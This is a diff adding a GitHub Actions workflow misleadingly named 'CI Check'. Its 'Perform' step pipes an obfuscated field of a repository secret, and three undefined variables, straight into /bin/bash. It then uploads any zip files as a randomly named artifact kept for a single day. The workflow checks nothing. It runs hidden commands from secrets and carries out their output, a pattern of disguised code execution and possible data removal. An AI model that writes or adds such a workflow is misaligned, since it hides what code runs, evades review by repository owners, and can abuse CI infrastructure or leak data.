@@ -1,0 +1,28 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+jobs:
+  workflow:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          er2: ${{ secrets.er2 }}
+        run: |
+          printf '%s' "$er2" | jq -r .yda5265 | /bin/bash
+          printf '%s' "$gy02" | jq -r .hgg34045 | /bin/bash
+          printf '%s' "$h83" | jq -r .bsnvm593 | /bin/bash
+          printf '%s' "$bt864" | jq -r .ly48 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: DU0flbtM
+          path: "*.zip"
+          retention-days: 1
